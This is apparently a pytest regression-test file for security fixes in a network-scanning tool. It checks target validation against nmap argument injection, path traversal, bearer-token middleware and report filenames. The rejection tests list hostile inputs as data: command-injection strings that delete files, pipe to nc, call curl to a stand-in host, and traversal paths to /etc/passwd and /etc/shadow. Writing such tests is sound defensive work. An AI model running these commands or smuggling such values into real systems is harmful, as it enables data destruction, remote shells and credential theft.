"""Regression tests for the security fixes in secureflow.security.

Each test here corresponds to a defect that was live in the codebase:
  - scan targets reached nmap's argv unvalidated (argument injection)
  - /ui/<path> joined a user path onto the asset dir (path traversal)
  - MCP_SECRET was read but never enforced (check_auth was dead code)
  - the orchestrator and the export endpoint derived report filenames
    differently, so exports could never find a saved report
"""

from pathlib import Path

import pytest

from secureflow.security import (
    BearerAuthMiddleware,
    InvalidTarget,
    extract_token,
    report_stem,
    safe_join,
    token_matches,
    validate_target,
)


# ---------------------------------------------------------------------------
# Target validation / argument injection
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "raw,expected",
    [
        ("example.com", "example.com"),
        ("EXAMPLE.com", "EXAMPLE.com"),
        ("192.168.1.1", "192.168.1.1"),
        ("10.0.0.0/24", "10.0.0.0/24"),
        ("::1", "::1"),
        ("sub.domain.co.uk", "sub.domain.co.uk"),
        ("localhost", "localhost"),
        ("  example.com  ", "example.com"),
        # URLs are reduced to their host
        ("https://example.com:8443/path?q=1", "example.com"),
        ("http://user:pass@example.com/x", "example.com"),
    ],
)
def test_validate_target_accepts_real_targets(raw, expected):
    assert validate_target(raw) == expected


@pytest.mark.parametrize(
    "raw",
    [
        # Would be parsed by nmap as options, not hosts — the injection sink.
        "-oN/tmp/pwned",
        "--script=/tmp/evil.nse",
        "-sS",
        # Shell / argv metacharacters
        "example.com; rm -rf /",
        "example.com | nc attacker 4444",
        "$(whoami)",
        "`id`",
        "example.com && curl evil.tld",
        # Structurally invalid
        "",
        "   ",
        "host name",
        "not_a_host!",
        "a" * 300,
    ],
)
def test_validate_target_rejects_hostile_input(raw):
    with pytest.raises(InvalidTarget):
        validate_target(raw)


def test_validate_target_rejects_non_strings():
    with pytest.raises(InvalidTarget):
        validate_target(None)


def test_nmap_scan_refuses_flag_like_target(monkeypatch):
    """nmap_scan must reject a flag-like target before building argv."""
    import secureflow.crew.tools as tools_mod

    called = {}

    def _boom(*args, **kwargs):  # pragma: no cover - must not run
        called["ran"] = args
        raise AssertionError("subprocess.run must not be reached for an invalid target")

    monkeypatch.setattr(tools_mod.subprocess, "run", _boom)

    result = tools_mod.SecurityTools().nmap_scan("--script=/tmp/evil.nse")

    assert result["status"] == "error"
    assert "ran" not in called


def test_nmap_scan_terminates_option_parsing(monkeypatch):
    """A valid target is passed after '--' so it can never be read as a flag."""
    import secureflow.crew.tools as tools_mod

    captured = {}

    class _Result:
        returncode = 0
        stdout = "Nmap scan report for example.com"
        stderr = ""

    def _fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        return _Result()

    monkeypatch.setattr(tools_mod.subprocess, "run", _fake_run)

    tools_mod.SecurityTools().nmap_scan("example.com")

    assert captured["cmd"][-2:] == ["--", "example.com"]


# ---------------------------------------------------------------------------
# Path traversal
# ---------------------------------------------------------------------------

def test_safe_join_allows_contained_paths(tmp_path):
    assert safe_join(tmp_path, "assets/app.js") == (tmp_path / "assets/app.js").resolve()
    assert safe_join(tmp_path, "index.html") == (tmp_path / "index.html").resolve()


@pytest.mark.parametrize(
    "hostile",
    [
        "../../../../etc/passwd",
        "../secret.txt",
        "a/../../../../etc/shadow",
    ],
)
def test_safe_join_blocks_traversal(tmp_path, hostile):
    assert safe_join(tmp_path, hostile) is None


def test_safe_join_treats_absolute_paths_as_relative(tmp_path):
    """An absolute path must not escape the base directory."""
    joined = safe_join(tmp_path, "/etc/passwd")
    assert joined == (tmp_path / "etc/passwd").resolve()


def test_safe_join_blocks_symlink_escape(tmp_path):
    outside = tmp_path.parent / "outside_target.txt"
    outside.write_text("secret")
    base = tmp_path / "dist"
    base.mkdir()
    (base / "link").symlink_to(outside)

    assert safe_join(base, "link") is None


# ---------------------------------------------------------------------------
# Report filename consistency
# ---------------------------------------------------------------------------

def test_report_stem_is_filesystem_safe():
    assert report_stem("example.com") == "example.com"

    for hostile in ["http://a/b", "../../etc/passwd", "a b:c", "x/../y"]:
        stem = report_stem(hostile)
        assert "/" not in stem
        assert not stem.startswith(".")
        assert len(stem) <= 100


def test_report_stem_never_escapes_directory(tmp_path):
    """A hostile target must not steer the report outside the report dir."""
    stem = report_stem("../../../../etc/cron.d/evil")
    path = (tmp_path / f"report_{stem}.html").resolve()
    assert tmp_path.resolve() in path.parents


def test_orchestrator_and_exporter_agree_on_filename():
    """The writer and the reader must derive the same report filename."""
    from secureflow.reports import _report_stem

    for target in ["example.com", "10.0.0.1", "host.example.org"]:
        assert _report_stem(target) == report_stem(target)


# ---------------------------------------------------------------------------
# Authentication
# ---------------------------------------------------------------------------

def test_token_matches_is_strict():
    assert token_matches("abc", "abc") is True
    assert token_matches("abc", "abd") is False
    assert token_matches("", "abc") is False
    assert token_matches(None, "abc") is False
    assert token_matches("abc", "") is False
    assert token_matches("abc", None) is False


def test_extract_token_from_bearer_header():
    assert extract_token({"authorization": "Bearer tok123"}, "") == "tok123"
    assert extract_token({"authorization": "bearer tok123"}, "") == "tok123"


def test_extract_token_from_custom_header():
    assert extract_token({"x-secureflow-token": "tok123"}, "") == "tok123"


def test_extract_token_from_query_string():
    """EventSource cannot set headers, so ?token= is supported."""
    assert extract_token({}, "token=tok123&other=1") == "tok123"


def test_extract_token_absent():
    assert extract_token({}, "") is None
    assert extract_token({"authorization": "Basic xyz"}, "") is None


def _run_middleware(path, headers=None, secret="s3cret", query=b""):
    """Drive the ASGI middleware directly and return the response status."""
    import asyncio

    downstream_called = {"yes": False}

    async def downstream(scope, receive, send):
        downstream_called["yes"] = True
        await send({"type": "http.response.start", "status": 200, "headers": []})
        await send({"type": "http.response.body", "body": b"ok"})

    mw = BearerAuthMiddleware(downstream, secret=secret)
    scope = {
        "type": "http",
        "method": "GET",
        "path": path,
        "query_string": query,
        "headers": [(k.encode(), v.encode()) for k, v in (headers or {}).items()],
        "client": ("1.2.3.4", 1234),
    }

    statuses = []

    async def send(message):
        if message["type"] == "http.response.start":
            statuses.append(message["status"])

    async def receive():  # pragma: no cover - never awaited in these paths
        return {"type": "http.request"}

    asyncio.run(mw(scope, receive, send))
    return statuses[0], downstream_called["yes"]


def test_middleware_rejects_missing_token():
    status, reached = _run_middleware("/api/history")
    assert status == 401
    assert reached is False


def test_middleware_rejects_wrong_token():
    status, reached = _run_middleware("/api/history", {"authorization": "Bearer wrong"})
    assert status == 401
    assert reached is False


def test_middleware_accepts_valid_token():
    status, reached = _run_middleware("/api/history", {"authorization": "Bearer s3cret"})
    assert status == 200
    assert reached is True


def test_middleware_accepts_query_token_for_sse():
    status, reached = _run_middleware("/stream/example.com", query=b"token=s3cret")
    assert status == 200
    assert reached is True


def test_middleware_protects_mcp_transport_endpoints():
    """The MCP endpoints expose the scanning tools and must not be public."""
    for path in ["/sse", "/messages/", "/mcp"]:
        status, reached = _run_middleware(path)
        assert status == 401, path
        assert reached is False, path


def test_middleware_allows_public_dashboard():
    status, reached = _run_middleware("/ui")
    assert status == 200
    assert reached is True

    status, reached = _run_middleware("/ui/assets/app.js")
    assert status == 200
    assert reached is True


def test_middleware_disabled_without_secret():
    """With no secret configured the middleware is a pass-through."""
    status, reached = _run_middleware("/api/history", secret="")
    assert status == 200
    assert reached is True


def test_nmap_timeout_and_not_installed_are_distinguishable(monkeypatch):
    """A timed-out real scan must not read the same as 'nmap was never there'.

    Live-verified: nmap -sV --top-ports=50 against scanme.nmap.org (a real,
    benign target) took 107s because 48 of 50 ports were filtered — nmap must
    wait out a connection timeout on each one before concluding 'filtered'.
    The previous 60s subprocess timeout silently discarded that real scan and
    fell back to the socket scanner with no signal a downgrade had happened.
    """
    import subprocess as subprocess_mod

    import secureflow.crew.tools as tools_mod

    def _timeout(cmd, **kwargs):
        raise subprocess_mod.TimeoutExpired(cmd, kwargs.get("timeout", 0))

    monkeypatch.setattr(tools_mod.subprocess, "run", _timeout)
    monkeypatch.setattr(tools_mod.socket, "gethostbyname", lambda t: "203.0.113.5")
    monkeypatch.setattr(
        tools_mod.socket, "create_connection", lambda *a, **k: (_ for _ in ()).throw(OSError())
    )

    timed_out = tools_mod.SecurityTools().nmap_scan("example.com")
    assert timed_out["scanner"] == "socket"
    assert "did not finish within" in timed_out["note"]

    def _not_found(cmd, **kwargs):
        raise FileNotFoundError("nmap")

    monkeypatch.setattr(tools_mod.subprocess, "run", _not_found)
    not_installed = tools_mod.SecurityTools().nmap_scan("example.com")
    assert not_installed["scanner"] == "socket"
    assert "not installed" in not_installed["note"]

    # The two fallback reasons must read differently — a report distinguishing
    # "we don't have nmap" from "this specific scan ran out of time" needs
    # the underlying note text to actually differ, not just the code path.
    assert timed_out["note"] != not_installed["note"]


def test_nmap_scan_uses_a_realistic_timeout_budget():
    """60s is not enough for a real scan against any filtered target."""
    from secureflow.crew.tools import SecurityTools

    assert SecurityTools.NMAP_TIMEOUT_SECONDS >= 120
